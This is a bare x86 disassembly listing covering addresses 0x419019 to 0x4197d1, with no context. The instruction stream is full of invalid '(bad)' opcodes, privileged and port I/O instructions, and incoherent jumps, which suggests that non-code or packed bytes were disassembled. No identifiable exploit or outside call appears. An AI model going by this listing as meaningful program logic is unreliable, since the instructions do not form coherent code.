  419019:	sub    esp,ebx
  41901b:	aaa    
  41901c:	xchg   edx,eax
  41901d:	xchg   ecx,eax
  41901e:	sbb    eax,0x72072531
  419023:	mov    bh,0x7f
  419025:	loope  0x418fef
  419027:	push   0x4c
  419029:	(bad)  
  41902a:	jns    0x419064
  41902c:	mov    ebp,0x3a63c037
  419031:	pusha  
  419032:	nop
  419033:	mov    ds:0x8fa33c57,al
  419038:	pop    ebx
  419039:	mul    DWORD PTR [eax+0x380dcaf7]
  41903f:	data16 mov al,ds:0xe80fbb8b
  419045:	cld    
  419046:	jae    0x4190a0
  419048:	cmp    cl,BYTE PTR [ebx]
  41904a:	pusha  
  41904b:	jae    0x419087
  41904d:	jmp    0x419048
  41904f:	push   es
  419050:	jno    0x4190a7
  419052:	aaa    
  419053:	ror    esp,0x8
  419056:	mov    WORD PTR [ebx+0x12],?
  419059:	xor    eax,0xd1ea8bff
  41905e:	jnp    0x41902b
  419060:	cmc    
  419061:	push   0xffffff84
  419063:	adc    DWORD PTR [eax],ebx
  419065:	outs   dx,DWORD PTR ds:[esi]
  419066:	sbb    DWORD PTR [ebp+0xc],esi
  419069:	lods   eax,DWORD PTR ds:[esi]
  41906a:	shl    ecx,cl
  41906c:	xchg   esi,eax
  41906d:	and    dl,ch
  41906f:	scas   eax,DWORD PTR es:[edi]
  419070:	xchg   edi,eax
  419072:	loop   0x4190ba
  419074:	stos   BYTE PTR es:[edi],al
  419075:	aam    0x23
  419077:	pop    ss
  419078:	imul   edi,DWORD PTR ds:0x95bb94fb,0x9039041a
  419082:	xchg   ebx,eax
  419083:	fmul   st(0),st
  419085:	add    dl,BYTE PTR [ecx+0x2081e804]
  41908b:	dec    esi
  41908c:	mov    ebp,DWORD PTR [edx+0x40]
  41908f:	bnd jns 0x4190df
  419092:	shl    dl,0xa6
  419095:	mov    ecx,0xde96656b
  41909a:	xchg   edi,eax
  41909b:	inc    esi
  41909c:	sbb    al,0xb8
  41909e:	pop    eax
  41909f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4190a0:	mov    bh,0x7b
  4190a2:	dec    esp
  4190a3:	scas   al,BYTE PTR es:[edi]
  4190a4:	pop    es
  4190a5:	mov    ecx,0x1c4b7b6a
  4190aa:	xchg   ebx,eax
  4190ab:	and    al,0xfc
  4190ad:	sub    BYTE PTR [ebp-0x51],ah
  4190b0:	sbb    al,0x43
  4190b2:	je     0x419104
  4190b4:	mov    ch,0x89
  4190b6:	fidivr WORD PTR [edx+0x73]
  4190b9:	dec    ecx
  4190ba:	lods   eax,DWORD PTR ds:[esi]
  4190bb:	addr16 jae 0x4190e0
  4190be:	dec    edx
  4190bf:	mov    WORD PTR [edi-0x68],ds
  4190c2:	sbb    al,0x77
  4190c4:	fdecstp 
  4190c6:	push   esp
  4190c7:	xor    cl,BYTE PTR [edi+eiz*4]
  4190ca:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  4190cc:	inc    esp
  4190cd:	cmc    
  4190ce:	aad    0xb3
  4190d0:	sub    al,0xa5
  4190d2:	fnstsw ax
  4190d4:	mov    ebx,0x9cd27f1b
  4190d9:	std    
  4190da:	fcom   DWORD PTR [ecx]
  4190dc:	xlat   BYTE PTR ds:[ebx]
  4190dd:	jns    0x419129
  4190df:	out    0x2c,eax
  4190e1:	xor    al,0xc3
  4190e3:	fnstcw WORD PTR [ecx]
  4190e5:	cmc    
  4190e6:	(bad)  
  4190e7:	and    al,dh
  4190e9:	test   eax,0xcd4bd3c9
  4190ee:	adc    eax,0x10e16af2
  4190f3:	dec    edx
  4190f4:	push   esi
  4190f5:	leave  
  4190f6:	xchg   ebp,eax
  4190f7:	and    BYTE PTR [eax],bh
  4190f9:	push   esi
  4190fa:	mov    al,0x68
  4190fc:	mov    ebp,0xdf46b3b4
  419101:	jecxz  0x419129
  419103:	mov    ch,0x2d
  419105:	rol    DWORD PTR [ebp-0x104f63c1],cl
  41910b:	xor    ebx,DWORD PTR [edi+ebp*4+0x27]
  41910f:	push   cs
  419110:	bound  ecx,QWORD PTR [ebx+0x5a]
  419113:	imul   ebp,esi,0x60
  419116:	data16 lods al,BYTE PTR ds:[esi]
  419118:	push   eax
  419119:	outs   dx,DWORD PTR ds:[esi]
  41911a:	dec    ebx
  41911b:	sbb    al,0x74
  41911d:	jmp    eax
  41911f:	or     al,0xbe
  419121:	out    dx,eax
  419122:	into   
  419123:	ret    
  419124:	repnz stc 
  419126:	scas   al,BYTE PTR es:[edi]
  419127:	dec    edx
  419128:	(bad)  
  419129:	pushf  
  41912a:	adc    esi,edx
  41912c:	int    0x95
  41912e:	(bad)  
  41912f:	jne    0x419172
  419131:	scas   al,BYTE PTR es:[edi]
  419132:	and    BYTE PTR [eax+ecx*1+0x25300b26],cl
  419139:	mov    al,ds:0xb0816007
  41913e:	xchg   ebx,eax
  41913f:	fnstcw WORD PTR [ecx]
  419141:	fisub  DWORD PTR [ebp+0xf]
  419144:	xchg   ecx,eax
  419145:	xchg   esp,eax
  419146:	add    al,0x15
  419148:	xor    eax,0x91d76af0
  41914d:	aaa    
  41914e:	repnz clts 
  419151:	mov    edi,0xf66362ec
  419156:	push   ecx
  419157:	hlt    
  419158:	push   edx
  419159:	push   eax
  41915a:	jne    0x41919e
  41915c:	out    0x32,eax
  41915e:	push   ebp
  41915f:	xor    BYTE PTR [esi],bl
  419161:	sbb    ecx,DWORD PTR [ebx+esi*4+0x37]
  419165:	add    al,0xec
  419167:	repz leave 
  419169:	push   0xeb921326
  41916e:	clc    
  41916f:	aad    0x7
  419171:	or     edx,ecx
  419173:	lock add ah,cl
  419176:	or     ebx,DWORD PTR [eax-0x5e]
  419179:	sbb    dh,BYTE PTR [eax]
  41917b:	fs inc esp
  41917d:	dec    esi
  41917e:	inc    ebp
  41917f:	add    al,0x4f
  419181:	sbb    al,0xc2
  419183:	add    eax,0x76ee14b
  419188:	push   es
  419189:	sub    DWORD PTR [ebx+0x2d],eax
  41918c:	and    ebp,DWORD PTR [ebp+0x3a91d98f]
  419192:	dec    edi
  419193:	xchg   DWORD PTR [edi],esi
  419195:	hlt    
  419196:	addr16 pop ds
  419198:	push   ebx
  419199:	sar    BYTE PTR [ecx+ebp*8-0x2d],1
  41919d:	out    dx,eax
  41919e:	in     al,dx
  41919f:	pop    edi
  4191a0:	int3   
  4191a1:	loop   0x41920e
  4191a3:	xor    DWORD PTR [edx+0x630f4396],esp
  4191a9:	outs   dx,BYTE PTR ds:[esi]
  4191aa:	cmp    al,0xdd
  4191ac:	call   0xd413:0xdce2b3d5
  4191b3:	gs icebp 
  4191b5:	ror    DWORD PTR [eax-0x18eda812],cl
  4191bb:	iret   
  4191bc:	jl     0x41914e
  4191be:	mov    dl,0x4a
  4191c0:	ss mov ebp,0xfa704dbf
  4191c6:	sub    BYTE PTR [eax+ecx*8],ah
  4191c9:	inc    ax
  4191cb:	leave  
  4191cc:	push   ecx
  4191cd:	addr16 jmp 0xc06:0x2b8df9c
  4191d5:	or     ah,0x25
  4191d8:	test   eax,0x616c69b1
  4191dd:	pop    esi
  4191de:	sub    al,0xfe
  4191e0:	pushf  
  4191e1:	sti    
  4191e2:	xchg   esp,eax
  4191e3:	iret   
  4191e4:	mov    bh,0x7a
  4191e6:	ret    
  4191e7:	rcl    BYTE PTR [edi],1
  4191e9:	aad    0xbe
  4191eb:	fcom   QWORD PTR [eax]
  4191ed:	mov    esp,0xa1f81c67
  4191f2:	add    BYTE PTR [edi+0x708a6897],0x61
  4191f9:	clc    
  4191fa:	inc    edx
  4191fb:	(bad)  
  4191fc:	cwde   
  4191fd:	std    
  4191fe:	popa   
  4191ff:	mov    esi,0xedde1a6c
  419204:	push   edi
  419205:	fs (bad) 
  419207:	icebp  
  419208:	scas   al,BYTE PTR es:[edi]
  419209:	cld    
  41920a:	adc    ah,BYTE PTR [edi-0x34716ac5]
  419210:	cld    
  419211:	sar    bh,cl
  419213:	pop    ss
  419214:	xchg   edx,eax
  419215:	jmp    DWORD PTR [ecx+0xd]
  419218:	loop   0x419220
  41921a:	inc    edi
  41921b:	jp     0x419288
  41921d:	lds    ecx,FWORD PTR [ecx]
  41921f:	sub    ah,BYTE PTR [eax+0x26]
  419222:	adc    BYTE PTR [edi-0x4fd12af9],dh
  419228:	cmp    al,0xcb
  41922a:	mov    ah,0xaf
  41922c:	mov    bh,0x7f
  41922e:	out    dx,eax
  41922f:	call   0x927a:0xcc9a4dae
  419236:	or     eax,0xb44db42d
  41923b:	xchg   esi,eax
  41923c:	fdivr  st(5),st
  41923e:	mov    dl,0xdc
  419240:	xchg   esp,eax
  419241:	adc    bl,BYTE PTR [bp+di+0x6c2]
  419246:	repnz loop 0x4191f5
  419249:	or     ah,bl
  41924b:	xchg   ebp,eax
  41924c:	sub    BYTE PTR [edx],dl
  41924e:	xor    al,0x78
  419250:	rcr    BYTE PTR [ecx-0x2],1
  419253:	pushf  
  419254:	shl    DWORD PTR [ecx+0x6dd0c047],1
  41925a:	mov    ah,0x1d
  41925c:	pop    ecx
  41925d:	stc    
  41925e:	ds pop ecx
  419260:	loop   0x419205
  419262:	inc    sp
  419264:	adc    BYTE PTR [eax+0xe22bd],dl
  41926a:	pop    esi
  41926b:	jg     0x41922d
  41926d:	popa   
  41926e:	add    al,0x38
  419270:	gs lock xchg edx,eax
  419273:	mov    dh,dh
  419275:	rol    cl,0x6e
  419278:	and    DWORD PTR [edi-0x21],0xffffff92
  41927c:	mov    eax,ds:0xc0c99de0
  419281:	or     bh,dh
  419283:	cmp    eax,0x1ff5bc1b
  419288:	aad    0x1b
  41928a:	xchg   ebx,eax
  41928b:	scas   al,BYTE PTR es:[edi]
  41928c:	xor    edx,DWORD PTR [ecx+0x53]
  41928f:	sbb    DWORD PTR [ebp-0x750a9bde],eax
  419295:	mov    bh,0x6f
  419297:	fsubr  DWORD PTR [edi+0x7166a882]
  41929d:	inc    edx
  41929e:	mov    ecx,0x99371fc0
  4192a3:	sub    BYTE PTR [esi],ah
  4192a5:	cmp    eax,0xbfa42686
  4192aa:	mov    dh,0xc
  4192ac:	lods   al,BYTE PTR ds:[esi]
  4192ad:	rcl    BYTE PTR [edi+0x208ef8c5],1
  4192b3:	cmp    edi,edi
  4192b5:	jnp    0x419336
  4192b7:	rcr    BYTE PTR [edi+0x33],0xd4
  4192bb:	push   edi
  4192bc:	lods   al,BYTE PTR ds:[esi]
  4192bd:	fisttp QWORD PTR [esi+0x4f]
  4192c0:	add    eax,edx
  4192c2:	mov    BYTE PTR [edx+0xb],al
  4192c5:	pop    esi
  4192c6:	dec    esp
  4192c7:	jp     0x419332
  4192c9:	pushf  
  4192ca:	cmp    eax,0xf7f15bce
  4192cf:	push   esi
  4192d0:	ins    DWORD PTR es:[edi],dx
  4192d1:	jno    0x4192a4
  4192d3:	retf   0x5998
  4192d6:	inc    esp
  4192d7:	ja     0x4192a9
  4192d9:	cmp    BYTE PTR [ecx-0x2518a12],dh
  4192df:	test   al,0x2a
  4192e1:	repz push 0xe9f689c0
  4192e7:	out    0x32,eax
  4192e9:	ja     0x419324
  4192eb:	xlat   BYTE PTR ds:[ebx]
  4192ec:	shl    BYTE PTR [esi-0x7e],1
  4192ef:	aam    0x9b
  4192f1:	inc    esp
  4192f2:	pop    esp
  4192f3:	xchg   ecx,eax
  4192f4:	mov    bl,0x33
  4192f6:	ret    0x4ec3
  4192f9:	xor    eax,DWORD PTR [di+0x67]
  4192fd:	xor    BYTE PTR [edx],dl
  4192ff:	sbb    DWORD PTR [edi],eax
  419301:	inc    esp
  419302:	pop    esp
  419303:	(bad)  
  419304:	jmp    DWORD PTR [esi+0x2f]
  419307:	shl    ecx,cl
  419309:	jp     0x419310
  41930b:	or     al,BYTE PTR [edx-0x4d]
  41930e:	mov    dh,0x47
  419310:	loopne 0x419376
  419312:	sbb    eax,0x81a498e5
  419317:	enter  0xa4f9,0x5e
  41931b:	shl    DWORD PTR [esi+0x1e],cl
  41931e:	int    0xab
  419320:	jecxz  0x419315
  419322:	test   eax,0x4f68c6b4
  419327:	mov    ecx,0xace0b168
  41932c:	or     BYTE PTR [edx],bh
  41932e:	xchg   esi,eax
  41932f:	dec    ecx
  419330:	lods   eax,DWORD PTR ds:[esi]
  419331:	push   ds
  419332:	(bad)
  419335:	ret    0xb150
  419338:	jnp    0x41937e
  41933a:	sar    DWORD PTR [eax+0x32],1
  41933d:	add    eax,DWORD PTR [ebp-0x7a]
  419340:	mov    bl,0xc8
  419342:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419343:	cmc    
  419344:	out    dx,al
  419345:	leave  
  419346:	pop    edx
  419347:	push   es
  419348:	les    esi,FWORD PTR [esi+0x3f908337]
  41934e:	cdq    
  41934f:	ret    
  419350:	adc    BYTE PTR [eax],bl
  419352:	fwait
  419353:	or     DWORD PTR [edi+0x58],esi
  419356:	rol    DWORD PTR [edi+0xbddb8f9],cl
  41935c:	fstp   st(0)
  41935e:	pop    edx
  41935f:	adc    di,WORD PTR ds:0xf97b8a6e
  419366:	jecxz  0x41933f
  419368:	popf   
  419369:	repnz outs dx,DWORD PTR ds:[esi]
  41936b:	dec    esi
  41936c:	add    al,0x9e
  41936e:	inc    esi
  41936f:	sub    DWORD PTR [eax],eax
  419371:	inc    DWORD PTR [ecx-0x62]
  419374:	mov    al,0x33
  419376:	xor    esi,DWORD PTR [ebx+0x5092e9a7]
  41937c:	add    DWORD PTR [esi],esi
  41937e:	add    ah,BYTE PTR [eax-0x429771e9]
  419384:	jl     0x4193ca
  419386:	cmp    al,0x72
  419388:	test   al,0xf2
  41938a:	(bad)  
  41938b:	loopne 0x419341
  41938d:	outs   dx,BYTE PTR ds:[esi]
  41938e:	cdq    
  41938f:	sbb    al,0x89
  419391:	shl    BYTE PTR ds:0x3bffcebd,1
  419397:	mov    eax,ds:0xd0cfe2aa
  41939c:	(bad)  
  41939d:	pop    esp
  41939e:	add    BYTE PTR [eax],bl
  4193a0:	xor    al,0x66
  4193a2:	ins    BYTE PTR es:[edi],dx
  4193a3:	aam    0xa0
  4193a5:	fadd   QWORD PTR [ecx]
  4193a7:	retf   
  4193a8:	push   eax
  4193a9:	adc    eax,0x27952cf5
  4193ae:	shl    DWORD PTR [edi+ebx*8],cl
  4193b1:	jmp    0x6b5924f4
  4193b6:	pop    ecx
  4193b7:	(bad)  
  4193b8:	addr16 lock repnz xchg ebx,eax
  4193bc:	xor    DWORD PTR [ebp+ebx*4+0x76b41d2a],ebp
  4193c3:	pop    ebp
  4193c4:	shl    edx,0x90
  4193c7:	iret   
  4193c8:	fcomp  st(1)
  4193ca:	mov    ds,WORD PTR [ebx-0x4cd86a85]
  4193d0:	dec    edx
  4193d1:	cmp    ecx,DWORD PTR [ebx+0x72]
  4193d4:	jbe    0x4193bb
  4193d6:	std    
  4193d7:	xchg   edx,eax
  4193d8:	jns    0x41941d
  4193da:	sbb    edx,ebx
  4193dc:	jl     0x4193ee
  4193de:	sbb    BYTE PTR [edi-0x22],0x38
  4193e2:	mov    esi,0x8f4d61d5
  4193e7:	shr    DWORD PTR [eax],cl
  4193e9:	inc    esp
  4193ea:	repnz mov ds:0xfe70c500,eax
  4193f0:	dec    edx
  4193f1:	clc    
  4193f2:	enter  0xe5e0,0x57
  4193f6:	fiadd  WORD PTR [esi+0xdbec6fe]
  4193fc:	and    BYTE PTR [ebp+eax*4+0x3a58209e],dl
  419403:	pop    edx
  419404:	push   0xc9f733f4
  419409:	lods   eax,DWORD PTR ds:[esi]
  41940a:	jo     0x4193d1
  41940c:	enter  0x1d8,0x6b
  419410:	push   ecx
  419411:	or     bl,BYTE PTR [esi+0x6a9c9ff8]
  419417:	repnz repnz test BYTE PTR [edi],dl
  41941b:	jmp    0xf3cf:0xbf216ad7
  419422:	les    edx,FWORD PTR [esi-0x539d295e]
  419428:	rol    DWORD PTR [esi+0x77],0x21
  41942c:	cmp    DWORD PTR [edx],edi
  41942e:	cld    
  41942f:	jcxz   0x419447
  419432:	inc    edi
  419433:	mov    ah,0xf4
  419435:	ins    BYTE PTR es:[edi],dx
  419436:	or     BYTE PTR [ebx-0x40825407],cl
  41943c:	mov    WORD PTR [edi+0x249226f0],ds
  419442:	pushf  
  419443:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419444:	jmp    0x1a22528f
  419449:	call   0x9285:0x7bfdc4a3
  419450:	add    DWORD PTR [eax+0x1a],0x5a81d8dc
  419457:	clc    
  419458:	sahf   
  419459:	push   edi
  41945a:	stc    
  41945b:	gs cli 
  41945d:	add    esi,ebx
  41945f:	dec    esp
  419460:	test   BYTE PTR [ebx-0x37],dl
  419463:	sub    edi,ebx
  419465:	push   esp
  419466:	cmp    ah,BYTE PTR [ecx*1-0xaba7f23]
  41946d:	stc    
  41946e:	out    0x16,eax
  419470:	mov    al,ds:0xaf4ba5ae
  419475:	jl     0x4194dc
  419477:	ret    0xe9d7
  41947a:	and    bl,BYTE PTR [ecx]
  41947c:	pop    ebx
  41947d:	sti    
  41947e:	mov    eax,ds:0x1f2ccc50
  419483:	vmread DWORD PTR [esi+0x1105d7d0],edi
  41948a:	jg     0x4194bb
  41948c:	adc    edx,esi
  41948e:	dec    ebx
  41948f:	fidivr WORD PTR [ebp+0x1f60c8df]
  419495:	jnp    0x419488
  419497:	and    al,0x3
  419499:	pop    ecx
  41949a:	mov    cl,0xe7
  41949c:	adc    al,0x69
  41949e:	jo     0x419491
  4194a0:	add    al,0x40
  4194a2:	mov    ebx,0x5e1619cc
  4194a7:	cli    
  4194a8:	aam    0x27
  4194aa:	adc    DWORD PTR [ebp+0x24d05721],edx
  4194b0:	rol    DWORD PTR [eax-0x6eff5dea],cl
  4194b6:	bound  ebp,QWORD PTR [esi-0x52]
  4194b9:	ror    BYTE PTR [ebp-0x33],1
  4194bc:	(bad)  
  4194bd:	ja     0x4194a0
  4194bf:	shl    ah,0x49
  4194c2:	jno    0x4194d5
  4194c4:	mov    DWORD PTR [ecx+0x3c1fee86],edi
  4194ca:	inc    ecx
  4194cb:	jnp    0x4194a9
  4194cd:	mov    ebp,DWORD PTR [ecx-0x643a9ef3]
  4194d3:	mov    ds:0x3b73f57c,al
  4194d8:	xor    ebp,edx
  4194da:	pop    eax
  4194db:	fs mov eax,0xd0b4ecaf
  4194e1:	(bad)  
  4194e2:	lahf   
  4194e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4194e4:	retf   
  4194e5:	test   BYTE PTR [edi],dl
  4194e7:	push   ebx
  4194e8:	push   ebx
  4194e9:	test   eax,0x78254959
  4194ee:	adc    ecx,DWORD PTR [eax]
  4194f0:	ret    0xf13c
  4194f3:	pop    eax
  4194f4:	fwait
  4194f5:	jns    0x41951c
  4194f7:	pop    ebx
  4194f8:	sub    BYTE PTR [edx-0x63],ah
  4194fb:	push   ss
  4194fc:	stos   DWORD PTR es:[edi],eax
  4194fd:	mov    bh,0x3
  4194ff:	xor    al,0x15
  419501:	adc    al,0x46
  419503:	sub    edx,ebx
  419505:	add    eax,0x8bd4b354
  41950a:	mov    dl,0xb2
  41950c:	xchg   ebp,eax
  41950d:	(bad)  
  41950e:	frstor es:0x2c225c49
  419515:	mov    ecx,DWORD PTR [eax+esi*1-0x6]
  419519:	call   DWORD PTR [esp+ebp*8-0x1f]
  41951d:	add    DWORD PTR [ecx],ebp
  41951f:	fdivr  DWORD PTR [ebx+0x5145018]
  419525:	and    DWORD PTR [esp+ecx*4-0x201f131a],edx
  41952c:	(bad)  
  41952e:	add    eax,0x7eb38e58
  419533:	cli    
  419534:	and    bh,BYTE PTR [ecx]
  419536:	xchg   edi,eax
  419537:	pop    es
  419538:	mov    ebx,0xd9117e9d
  41953d:	and    BYTE PTR [esp+esi*2+0x74],ch
  419541:	cmp    BYTE PTR es:[edx],cl
  419544:	lahf   
  419545:	rol    BYTE PTR [esi+0x39],0x58
  419549:	(bad)  
  41954c:	sub    dh,BYTE PTR [eax]
  41954e:	test   DWORD PTR [ebx-0x2a],0xf0bb2f51
  419555:	lahf   
  419556:	jle    0x419511
  419558:	outs   dx,BYTE PTR ds:[esi]
  419559:	(bad)  
  41955c:	test   al,0x30
  41955e:	out    0x72,al
  419560:	push   0x1ccc6629
  419565:	stc    
  419566:	mov    ebp,0x3cfa1242
  41956b:	sub    DWORD PTR [ebp-0x21],ecx
  41956e:	rol    ecx,cl
  419570:	test   DWORD PTR [eax+ebp*4-0x24f14053],0x9d64e063
  41957b:	push   esi
  41957c:	adc    DWORD PTR [edi+0xb],ecx
  41957f:	ins    DWORD PTR es:[edi],dx
  419580:	push   edx
  419581:	js     0x4195dd
  419583:	stos   BYTE PTR es:[edi],al
  419584:	fwait
  419585:	inc    ecx
  419586:	mov    ecx,0xb4e1f549
  41958b:	inc    edi
  41958c:	(bad)  
  41958d:	rol    dh,cl
  41958f:	or     ah,dh
  419591:	xlat   BYTE PTR ds:[ebx]
  419592:	jae    0x419602
  419594:	xor    al,0xeb
  419596:	data16 scas al,BYTE PTR es:[edi]
  419598:	out    0xd6,eax
  41959a:	out    dx,al
  41959b:	(bad)
  4195a0:	hlt    
  4195a1:	xor    DWORD PTR gs:[edx+0x24],0xff27c268
  4195a9:	mov    ah,0x89
  4195ab:	clc    
  4195ac:	imul   ebx,ebx,0xaf0b0308
  4195b2:	push   edi
  4195b3:	(bad)  
  4195b5:	mov    dh,0xd7
  4195b7:	leave  
  4195b8:	jo     0x419605
  4195ba:	dec    esp
  4195bb:	or     BYTE PTR [eax+0x3ac0c68b],bl
  4195c1:	pop    ecx
  4195c2:	xchg   BYTE PTR [edi+edx*1-0x20],bl
  4195c6:	in     eax,0x40
  4195c8:	xor    ebx,DWORD PTR [edi+eiz*4+0xc]
  4195cc:	mov    bh,0xa6
  4195ce:	ins    DWORD PTR es:[edi],dx
  4195cf:	ss mov bh,0x5d
  4195d2:	aam    0xd9
  4195d4:	sbb    eax,0x65b514ff
  4195d9:	pop    eax
  4195da:	jmp    0xf9c9:0x63316c0
  4195e1:	pushf  
  4195e2:	rcr    BYTE PTR [ebp-0x70],1
  4195e5:	icebp  
  4195e6:	aaa    
  4195e7:	ret    0xef96
  4195ea:	jae    0x4195df
  4195ec:	dec    DWORD PTR ss:[esi-0x4674fab4]
  4195f3:	data16 jecxz 0x419620
  4195f6:	dec    ebp
  4195f7:	or     DWORD PTR [edi-0x72],esi
  4195fa:	cmp    edi,DWORD PTR [edi-0x5c]
  4195fd:	jecxz  0x419617
  4195ff:	out    0x24,al
  419601:	xor    ah,bl
  419603:	inc    esi
  419604:	ins    DWORD PTR es:[edi],dx
  419605:	xor    al,0x65
  419607:	test   al,0xce
  419609:	adc    DWORD PTR [eax+eax*4],ebp
  41960c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41960d:	or     al,0x68
  41960f:	ds out 0x19,al
  419612:	push   es
  419613:	or     DWORD PTR [ebx+0x54],0xffffffb5
  419617:	leave  
  419618:	retf   0xb2d9
  41961b:	(bad)  
  41961d:	test   BYTE PTR [ecx+0x2aae96a2],bh
  419623:	les    esp,FWORD PTR [edx+0x2c]
  419626:	and    DWORD PTR [ecx+0x67ccfade],0xb40ab1f5
  419630:	loope  0x419699
  419632:	ss loopne 0x4195c0
  419635:	inc    eax
  419636:	xor    DWORD PTR [esi-0x37],edi
  419639:	mov    esp,DWORD PTR [ecx+0x745dfb6a]
  41963f:	adc    ecx,DWORD PTR [edi+0x49]
  419642:	dec    esi
  419643:	cli    
  419644:	pop    esp
  419645:	jle    0x4196b8
  419647:	xlat   BYTE PTR ds:[ebx]
  419648:	mov    ds:0x18da45ad,eax
  41964d:	in     al,0xc6
  41964f:	ret    0x9fc9
  419652:	sbb    eax,0x54006748
  419657:	mov    esp,0x5695b1ff
  41965c:	sbb    dh,dl
  41965e:	pop    ebx
  41965f:	mov    ebp,0x9c14bc2d
  419664:	stc    
  419665:	(bad)  
  419666:	sbb    eax,0x9c0ce337
  41966b:	jl     0x419626
  41966d:	in     al,0x5c
  41966f:	shl    al,0xe2
  419672:	pop    ebx
  419673:	lods   eax,DWORD PTR ds:[esi]
  419674:	xor    ecx,DWORD PTR [ecx+0x71]
  419677:	dec    esp
  419678:	xchg   edi,eax
  419679:	adc    BYTE PTR [esi-0x60],ch
  41967c:	loop   0x4196b5
  41967e:	and    BYTE PTR [esp+eax*4],al
  419681:	mov    dh,0x61
  419683:	outs   dx,DWORD PTR ds:[esi]
  419684:	lods   al,BYTE PTR ds:[esi]
  419685:	jmp    0x419632
  419687:	jl     0x4196d3
  419689:	mov    bl,0x96
  41968b:	xchg   esp,eax
  41968c:	inc    ebx
  41968d:	ds jo  0x4196a5
  419690:	je     0x419674
  419692:	jnp    0x419683
  419694:	rcl    eax,0xe4
  419697:	pop    ebp
  419698:	mov    esi,0x4637fd54
  41969d:	or     eax,0xe8e23891
  4196a2:	push   ds
  4196a3:	es (bad) 
  4196a5:	sub    al,0xe2
  4196a7:	xor    eax,0x60ca425e
  4196ac:	mov    WORD PTR [ebp+0x1f9d90a0],ss
  4196b2:	int3   
  4196b3:	pop    ss
  4196b4:	add    edx,DWORD PTR [ebx+0x32]
  4196b7:	fst    DWORD PTR ds:0xb6ed4fea
  4196bd:	aam    0xc8
  4196bf:	(bad)  
  4196c0:	idiv   BYTE PTR [edi+edx*2+0x19e3601f]
  4196c7:	or     DWORD PTR [eax],edx
  4196c9:	int3   
  4196ca:	xchg   edi,eax
  4196cb:	call   0xa194ead4
  4196d0:	out    0x84,eax
  4196d2:	imul   edi,DWORD PTR [ebp-0x7f],0xffffffa8
  4196d6:	fldcw  WORD PTR [ecx]
  4196d8:	cwde   
  4196d9:	push   ecx
  4196da:	fwait
  4196db:	outs   dx,BYTE PTR ds:[esi]
  4196dc:	dec    ebp
  4196dd:	imul   eax,DWORD PTR [ebp-0x5865610f],0x26
  4196e4:	pop    eax
  4196e5:	sbb    BYTE PTR [ebp+0x27],ah
  4196e8:	jp     0x419729
  4196ea:	fwait
  4196eb:	repnz cli 
  4196ed:	cmp    BYTE PTR [ebx],ch
  4196ef:	enter  0xf5c3,0x8
  4196f3:	xlat   BYTE PTR ds:[ebx]
  4196f4:	and    bh,dh
  4196f6:	out    dx,eax
  4196f7:	push   ebp
  4196f8:	pop    ebx
  4196f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4196fa:	inc    eax
  4196fb:	shl    DWORD PTR [edi+0x21],0xe4
  4196ff:	stos   BYTE PTR es:[edi],al
  419700:	pop    esp
  419701:	arpl   di,ax
  419703:	(bad)  
  419704:	test   al,0x31
  419706:	scas   al,BYTE PTR es:[edi]
  419707:	cli    
  419708:	rcl    BYTE PTR [eax+0x63],cl
  41970b:	xchg   edi,eax
  41970c:	setnp  BYTE PTR [ebx]
  41970f:	out    dx,al
  419710:	mov    dh,0xeb
  419712:	sub    BYTE PTR [ebp-0x6a],al
  419715:	fsubr  DWORD PTR [esi-0x178e0c87]
  41971b:	out    0x6d,eax
  41971d:	and    DWORD PTR [ebx],eax
  41971f:	push   0x73
  419721:	cmp    bl,BYTE PTR [esi-0x7a]
  419724:	xchg   edx,eax
  419725:	daa    
  419726:	and    ecx,edx
  419728:	sbb    ebp,esi
  41972a:	sbb    al,0x1c
  41972c:	xlat   BYTE PTR ds:[ebx]
  41972d:	inc    ecx
  41972e:	clc    
  41972f:	mov    ds:0xe2326b1c,al
  419734:	cli    
  419735:	and    ebp,DWORD PTR [edi]
  419737:	pop    edi
  419738:	xor    ah,cl
  41973a:	cmp    DWORD PTR [edi+ecx*1-0x2],ebp
  41973e:	call   0x3f5:0xd1c82af2
  419745:	dec    eax
  419746:	dec    ebp
  419747:	jp     0x419774
  419749:	mov    esp,0x41124779
  41974e:	adc    BYTE PTR [eax-0x76b07a3],bl
  419754:	pop    eax
  419755:	push   ecx
  419756:	je     0x4196f3
  419758:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419759:	dec    edi
  41975a:	push   esp
  41975b:	daa    
  41975c:	(bad)  
  41975d:	xchg   ebp,eax
  41975e:	pusha  
  41975f:	sub    al,0x8
  419761:	test   eax,0x7606f85c
  419766:	out    0x92,al
  419768:	ffree  st(1)
  41976a:	int    0x2
  41976c:	jbe    0x4197dd
  41976e:	pop    ecx
  41976f:	aam    0xeb
  419771:	push   esp
  419772:	ja     0x41972c
  419774:	cmp    DWORD PTR [ebx-0x5a],edx
  419777:	jge    0x419709
  419779:	outs   dx,BYTE PTR ds:[esi]
  41977a:	xchg   edi,eax
  41977b:	bound  edi,QWORD PTR [ebp+0x776bd8b3]
  419781:	push   ds
  419782:	mov    esi,0x412257f8
  419787:	push   DWORD PTR ds:0x6712c139
  41978d:	push   ds
  41978e:	sbb    cl,0xbe
  419791:	inc    esi
  419792:	loop   0x4197c6
  419794:	mov    ah,0xb5
  419796:	add    al,ah
  419798:	retf   
  419799:	add    al,0x1f
  41979b:	out    dx,eax
  41979c:	lods   eax,DWORD PTR ds:[esi]
  41979d:	ret    0xa66d
  4197a0:	inc    ebx
  4197a1:	mov    es,WORD PTR [esi-0x72]
  4197a4:	dec    eax
  4197a5:	jg     0x41976b
  4197a7:	sbb    al,0x7b
  4197a9:	pop    eax
  4197aa:	mov    esi,edx
  4197ac:	lea    esp,[eax-0x119f0311]
  4197b2:	jg     0x4197af
  4197b4:	fnstenv [esi+eiz*2-0x65]
  4197b8:	push   ecx
  4197b9:	sbb    al,0x64
  4197bb:	add    ah,al
  4197bd:	mov    edx,0x913a7133
  4197c2:	xor    DWORD PTR [edx-0x78],0x29cb5a94
  4197c9:	les    eax,FWORD PTR [eax+0x23]
  4197cc:	push   ebp
  4197cd:	xor    al,0xc4
  4197d0:	pop    ds
  4197d1:	sbb    ah,BYTE PTR [edx]
